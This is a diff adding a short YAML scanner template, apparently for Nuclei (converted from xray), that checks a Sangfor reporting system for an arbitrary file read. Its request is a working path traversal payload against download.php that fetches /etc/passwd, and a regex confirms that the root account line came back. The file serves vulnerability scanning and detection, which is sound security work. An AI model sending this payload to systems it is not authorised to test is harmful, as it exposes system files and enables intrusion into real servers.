@@ -1,0 +1,25 @@
+id: poc-yaml-sanfor-reporter-anyfileread
+
+info:
+  name: poc-yaml-sanfor-reporter-anyfileread
+  author: cyesc
+  severity: high
+  tags: xray-converted,ct-483499
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        GET /report/download.php?pdf=../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "(root|toor):[x*]:0:0:"
